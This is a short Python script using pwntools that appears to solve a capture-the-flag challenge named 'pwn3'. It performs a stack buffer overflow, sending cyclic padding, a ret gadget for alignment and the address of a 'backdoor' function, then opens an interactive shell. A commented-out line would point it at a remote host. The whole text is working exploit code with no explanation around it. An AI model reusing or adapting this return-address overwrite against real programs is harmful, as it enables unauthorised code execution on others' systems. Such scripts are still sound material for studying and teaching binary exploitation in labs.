from pwn import *
context(arch = 'amd64', os = 'linux', log_level = 'debug')
#io = remote('ip', port)
io = process('./pwn3')
elf = ELF('./pwn3')
backdoor = elf.sym['backdoor']
ret = 0x000000000040101a
payload = cyclic(0xA+8) + p64(ret) + p64(backdoor)
io.sendline(payload)
io.recv()
io.interactive()

